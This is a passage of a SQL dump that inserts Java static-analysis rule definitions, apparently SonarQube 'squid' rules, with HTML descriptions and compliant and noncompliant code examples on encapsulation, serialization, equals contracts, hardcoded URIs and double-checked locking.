</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812694, 1510817812694, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (710, 'Class variable fields should not have public accessibility', 'ClassVariableVisibilityCheck', 'S1104', 'squid', '<p>Public class variable fields do not respect the encapsulation principle and has three main disadvantages:</p>
<ul>
  <li> Additional behavior such as validation cannot be added. </li>
  <li> The internal representation is exposed, and cannot be changed afterwards. </li>
  <li> Member values are subject to change from anywhere in the code and may not meet the programmer''s assumptions. </li>
</ul>
<p>By using private attributes and accessor methods (set and get), unauthorized modifications are prevented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked

  public String firstName;                       // Noncompliant

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked

  private String firstName;                      // Compliant

  public String getFirstName() {
    return firstName;
  }

  public void setFirstName(String firstName) {
    this.firstName = firstName;
  }

}
</pre>
<h2>Exceptions</h2>
<p>Because they are not modifiable, this rule ignores <code>public final</code> fields.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/493.html">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe', false, 'HTML', 1510817812701, 1510817812702, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (711, 'Close curly brace and the next "else", "catch" and "finally" keywords should be on two different lines', 'RightCurlyBraceDifferentLineAsNextBlockCheck', 'S1108', 'squid', '<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>
<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on
two different lines.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {          // Noncompliant
    doSomethingElse();
  }
  else {                               // Compliant
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  }
  finally {
    closeConnection();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  }
  else if (somethingElse) {
    doSomethingElse();
  }
  else {
     generateError();
  }

  try {
    generateOrder();
  }
  catch (Exception e) {
    log(e);
  }
  finally {
    closeConnection();
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812702, 1510817812703, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (712, 'The non-serializable super class of a "Serializable" class should have a no-argument constructor', 'S2055', NULL, 'squid', '<p>When a <code>Serializable</code> object has a non-serializable ancestor in its inheritance chain, object deserialization (re-instantiating the
object from file) starts at the first non-serializable class, and proceeds down the chain, adding the properties of each subsequent child class, until
the final object has been instantiated. </p>
<p>In order to create the non-serializable ancestor, its no-argument constructor is called. Therefore the non-serializable ancestor of a
<code>Serializable</code> class must have a no-arg constructor. Otherwise the class is <code>Serializable</code> but not deserializable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  private Season ripe;

  public Fruit (Season ripe) {...}
  public void setRipe(Season ripe) {...}
  public Season getRipe() {...}
}

public class Raspberry extends Fruit
        implements Serializable {  // Noncompliant; nonserializable ancestor doesn''t have no-arg constructor
  private static final long serialVersionUID = 1;

  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  private Season ripe;

  public Fruit () {...};  // Compliant; no-arg constructor added to ancestor
  public Fruit (Season ripe) {...}
  public void setRipe(Season ripe) {...}
  public Season getRipe() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;

  private String variety;

  public Raspberry(Season ripe, String variety) {...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'serialization', false, 'HTML', 1510817812703, 1510817812704, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (716, '"Serializable" classes should have a version id', 'S2057', NULL, 'squid', '<p>A <code>serialVersionUID</code> field is required in all <code>Serializable</code> classes. If you do not provide one, one will be calculated for
you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an entirely new id,
and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the class.</p>
<p><code>serialVersionUID</code>''s should be declared with all of these modifiers: <code>static final long</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry extends Fruit  // Noncompliant; no serialVersionUID.
        implements Serializable {
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Exceptions</h2>
<p>Swing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and <code>Error</code>s),
and classes marked with <code>@SuppressWarnings("serial")</code> are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYCpAQ">CERT, SER00-J.</a> - Enable serialization compatibility during class evolution
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,pitfall,serialization', false, 'HTML', 1510817812708, 1510817812708, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (717, 'Child class methods named for parent class methods should be overrides', 'S2177', NULL, 'squid', '<p>When a method in a child class has the same signature as a method in a parent class, it is assumed to be an override. However, that''s not the case
when:</p>
<ul>
  <li> the parent class method is <code>static</code> and the child class method is not. </li>
  <li> the arguments or return types of the child method are in different packages than those of the parent method. </li>
  <li> the parent class method is <code>private</code>. </li>
</ul>
<p>Typically, these things are done unintentionally; the private parent class method is overlooked, the <code>static</code> keyword in the parent
declaration is overlooked, or the wrong class is imported in the child. But if the intent is truly for the child class method to be different, then
the method should be renamed to prevent confusion. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Parent.java
import computer.Pear;
public class Parent {

  public void doSomething(Pear p) {
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}

// Child.java
import fruit.Pear;
public class Child extends Parent {

  public void doSomething(Pear p) {  // Noncompliant; this is not an override
    // ...
  }


  public void doSomethingElse() {  // Noncompliant; parent method is static
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Parent.java
import computer.Pear;
public class Parent {

  public void doSomething(Pear p) {
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}

// Child.java
import computer.Pear;  // import corrected
public class Child extends Parent {

  public void doSomething(Pear p) {  // true override (see import)
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812709, 1510817812709, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (722, 'String literals should not be duplicated', 'S1192', NULL, 'squid', '<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
public void run() {
  prepare("action1");                              // Noncompliant - "action1" is duplicated 3 times
  execute("action1");
  release("action1");
}

@SuppressWarning("all")                            // Compliant - annotations are excluded
private void method1() { /* ... */ }
@SuppressWarning("all")
private void method2() { /* ... */ }

public String method3(String a) {
  System.out.println("''" + a + "''");               // Compliant - literal "''" has less than 5 characters and is excluded
  return "";                                       // Compliant - literal "" has less than 5 characters and is excluded
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final String ACTION_1 = "action1";  // Compliant

public void run() {
  prepare(ACTION_1);                               // Compliant
  execute(ACTION_1);
  release(ACTION_1);
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '2min', NULL, '2min', 'per duplicate instance', NULL, 'design', false, 'HTML', 1510817812715, 1510817812715, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (723, 'Exception types should not be tested using "instanceof" in catch blocks', 'S1193', NULL, 'squid', '<p>Multiple catch blocks of the appropriate type should be used instead of catching a general exception, and then testing on the type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  if(e instanceof IOException) { /* ... */ }         // Noncompliant
  if(e instanceof NullPointerException{ /* ... */ }  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (IOException e) { /* ... */ }                // Compliant
} catch (NullPointerException e) { /* ... */ }       // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/5gFFB">CERT, ERR51-J.</a> - Prefer user-defined exceptions over more general exception
  types </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,clumsy,error-handling', false, 'HTML', 1510817812717, 1510817812718, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (724, 'Subclasses that add fields should override "equals"', 'S2160', NULL, 'squid', '<p>Extend a class that overrides <code>equals</code> and add fields without overriding <code>equals</code> in the subclass, and you run the risk of
non-equivalent instances of your subclass being seen as equal, because only the superclass fields will be considered in the equality test.</p>
<p>This rule looks for classes that do all of the following:</p>
<ul>
  <li> extend classes that override <code>equals</code>. </li>
  <li> do not themselves override <code>equals</code>. </li>
  <li> add fields. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (this.class != obj.class) {
      return false;
    }
    Fruit fobj = (Fruit) obj;
    if (ripe.equals(fobj.getRipe()) {
      return true;
    }
    return false;
  }
}

public class Raspberry extends Fruit {  // Noncompliant; instances will use Fruit''s equals method
  private Color ripeColor;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (this.class != obj.class) {
      return false;
    }
    Fruit fobj = (Fruit) obj;
    if (ripe.equals(fobj.getRipe()) {
      return true;
    }
    return false;
  }
}

public class Raspberry extends Fruit {
  private Color ripeColor;

  public boolean equals(Object obj) {
    if (! super.equals(obj)) {
      return false;
    }
    Raspberry fobj = (Raspberry) obj;
    if (ripeColor.equals(fobj.getRipeColor()) {  // added fields are tested
      return true;
    }
    return false;
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812719, 1510817812719, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (729, '"equals" methods should be symmetric and work for subclasses', 'S2162', NULL, 'squid', '<p>A key facet of the <code>equals</code> contract is that if <code>a.equals(b)</code> then <code>b.equals(a)</code>, i.e. that the relationship is
symmetric. </p>
<p>Using <code>instanceof</code> breaks the contract when there are subclasses, because while the child is an <code>instanceof</code> the parent, the
parent is not an <code>instanceof</code> the child. For instance, assume that <code>Raspberry extends Fruit</code> and adds some fields (requiring a
new implementation of <code>equals</code>):</p>
<pre>
Fruit fruit = new Fruit();
Raspberry raspberry = new Raspberry();

if (raspberry instanceof Fruit) { ... } // true
if (fruit instanceof Raspberry) { ... } // false
</pre>
<p>If similar <code>instanceof</code> checks were used in the classes'' <code>equals</code> methods, the symmetry principle would be broken:</p>
<pre>
raspberry.equals(fruit); // false
fruit.equals(raspberry); //true
</pre>
<p>Additionally, non <code>final</code> classes shouldn''t use a hardcoded class name in the <code>equals</code> method because doing so breaks the
method for subclasses. Instead, make the comparison dynamic.</p>
<p>Further, comparing to an unrelated class type breaks the contract for that unrelated type, because while
<code>thisClass.equals(unrelatedClass)</code> can return true, <code>unrelatedClass.equals(thisClass)</code> will not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit extends Food {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (obj == null) {
      return false;
    }
    if (Fruit.class == obj.getClass()) { // Noncompliant; broken for child classes
      return ripe.equals(((Fruit)obj).getRipe());
    }
    if (obj instanceof Fruit ) {  // Noncompliant; broken for child classes
      return ripe.equals(((Fruit)obj).getRipe());
    }
    else if (obj instanceof Season) { // Noncompliant; symmetry broken for Season class
      // ...
    }
    //...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit extends Food {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (obj == null) {
      return false;
    }
    if (this.getClass() == obj.getClass()) {
      return ripe.equals(((Fruit)obj).getRipe());
    }
    return false;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zIUbAQ">CERT, MET08-J.</a> - Preserve the equality contract when overriding the
  equals() method </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812726, 1510817812726, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (730, 'URIs should not be hardcoded', 'S1075', NULL, 'squid', '<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI''s or path delimiters are hard coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  public Collection&lt;User&gt; listUsers() {
    File userList = new File("/home/mylogin/Dev/users.txt"); // Non-Compliant
    Collection&lt;User&gt; users = parse(userList);
    return users;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  // Configuration is a class that returns customizable properties: it can be mocked to be injected during tests.
  private Configuration config;
  public Foo(Configuration myConfig) {
    this.config = myConfig;
  }
  public Collection&lt;User&gt; listUsers() {
    // Find here the way to get the correct folder, in this case using the Configuration object
    String listingFolder = config.getProperty("myApplication.listingFolder");
    // and use this parameter instead of the hard coded path
    File userList = new File(listingFolder, "users.txt"); // Compliant
    Collection&lt;User&gt; users = parse(userList);
    return users;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'android,cert', false, 'HTML', 1510817812727, 1510817812727, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (731, '"finalize" should not set fields to "null"', 'S2165', NULL, 'squid', '<p>There is no point in setting class fields to <code>null</code> in a finalizer. If this this is a hint to the garbage collector, it is unnecessary -
the object will be garbage collected anyway - and doing so may actually cause extra work for the garbage collector.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private String name;

  @Override
  void finalize() {
    name = null;  // Noncompliant; completely unnecessary
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,performance', false, 'HTML', 1510817812728, 1510817812729, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (732, 'Default annotation parameter values should not be passed as arguments', 'S3254', NULL, 'squid', '<p>Specifying the default value for an annotation parameter is redundant. Such values should be omitted in the interests of readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@MyAnnotation(arg = "def")  // Noncompliant
public class MyClass {
  // ...
}
public @interface MyAnnotation {
  String arg() default "def";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@MyAnnotation
public class MyClass {
  // ...
}
public @interface MyAnnotation {
  String arg() default "def";
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812729, 1510817812730, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (735, 'Struts validation forms should have unique names', 'S3374', NULL, 'squid', '<p>According to the Common Weakness Enumeration,</p>
<blockquote>
  If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the
  other. This decision might not correspond to the programmer''s expectations...
</blockquote>
<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/102.html">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms </li>
  <li> <a href="https://www.owasp.org/index.php/Struts:_Duplicate_Validation_Forms#Struts:_Duplicate_Validation_Forms">OWASP, Improper Data
  Validation</a> - Struts: Duplicate Validation Forms </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe,struts', false, 'HTML', 1510817812733, 1510817812733, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (736, '"compareTo" should not return "Integer.MIN_VALUE"', 'S2167', NULL, 'squid', '<p>It is the sign, rather than the magnitude of the value returned from <code>compareTo</code> that matters. Returning <code>Integer.MIN_VALUE</code>
does <em>not</em> convey a higher degree of inequality, and doing so can cause errors because the return value of <code>compareTo</code> is sometimes
inversed, with the expectation that negative values become positive. However, inversing <code>Integer.MIN_VALUE</code> yields
<code>Integer.MIN_VALUE</code> rather than <code>Integer.MAX_VALUE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int compareTo(MyClass) {
  if (condition) {
    return Integer.MIN_VALUE;  // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public int compareTo(MyClass) {
  if (condition) {
    return -1;
  }
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812734, 1510817812734, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (737, 'Nested code blocks should not be used', 'S1199', NULL, 'squid', '<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method
typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD: {                                // Noncompliant - nested code block ''{'' ... ''}''
        int a = stack.pop();
        int b = stack.pop();
        int result = a + b;
        stack.push(result);
        break;
      }
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD:                                  // Compliant
      evaluateAdd();
      break;
    /* ... */
  }
}

private void evaluateAdd() {
  int a = stack.pop();
  int b = stack.pop();
  int result = a + b;
  stack.push(result);
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812735, 1510817812735, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (738, 'Classes named like "Exception" should extend "Exception" or a subclass', 'S2166', NULL, 'squid', '<p>Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code.
Using "exception" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation
that a class'' name will indicate what it is and/or does.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitException {  // Noncompliant; this has nothing to do with Exception
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException {  // Noncompliant; the extends clause was forgotten?
  public CarException(String message, Throwable cause) {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitSport {
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException extends Exception {
  public CarException(String message, Throwable cause) {
  // ...
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,pitfall', false, 'HTML', 1510817812736, 1510817812737, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (739, 'Double-checked locking should not be used', 'S2168', NULL, 'squid', '<p>Double-checked locking is the practice of checking a lazy-initialized object''s state both before and after a <code>synchronized</code> block is
entered to determine whether or not to initialize the object.</p>
<p>It does not work reliably in a platform-independent manner without additional synchronization for mutable instances of anything other than
<code>float</code> or <code>int</code>. Using double-checked locking for the lazy initialization of any other type of primitive or mutable object
risks a second thread using an uninitialized or partially initialized member while the first thread is still creating it, and crashing the
program.</p>
<p>There are multiple ways to fix this. The simplest one is to simply not use double checked locking at all, and synchronize the whole method instead.
With early versions of the JVM, synchronizing the whole method was generally advised against for performance reasons. But <code>synchronized</code>
performance has improved a lot in newer JVMs, so this is now a preferred solution. If you prefer to avoid using <code>synchronized</code> altogether,
you can use an inner <code>static class</code> to hold the reference instead. Inner static classes are guaranteed to load lazily.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@NotThreadSafe
public class DoubleCheckedLocking {
    private static Resource resource;

    public static Resource getInstance() {
        if (resource == null) {
            synchronized (DoubleCheckedLocking.class) {
                if (resource == null)
                    resource = new Resource();
            }
        }
        return resource;
    }

    static class Resource {

    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@ThreadSafe
public class SafeLazyInitialization {
    private static Resource resource;

    public synchronized static Resource getInstance() {
        if (resource == null)
            resource = new Resource();
        return resource;
    }

    static class Resource {
    }
}
</pre>
<p>With inner static holder:</p>
<pre>
@ThreadSafe
public class ResourceFactory {
    private static class ResourceHolder {
        public static Resource resource = new Resource(); // This will be lazily initialised
    }

    public static Resource getResource() {
        return ResourceFactory.ResourceHolder.resource;
    }

    static class Resource {
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html">The "Double-Checked Locking is Broken" Declaration</a> </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/IgAZAg">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/609.html">MITRE, CWE-609</a> - Double-checked locking </li>
  <li> <a href="https://docs.oracle.com/javase/specs/jls/se7/html/jls-12.html#jls-12.4">JLS 12.4</a> - Initialization of Classes and Interfaces </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,multi-threading', false, 'HTML', 1510817812737, 1510817812738, 2);
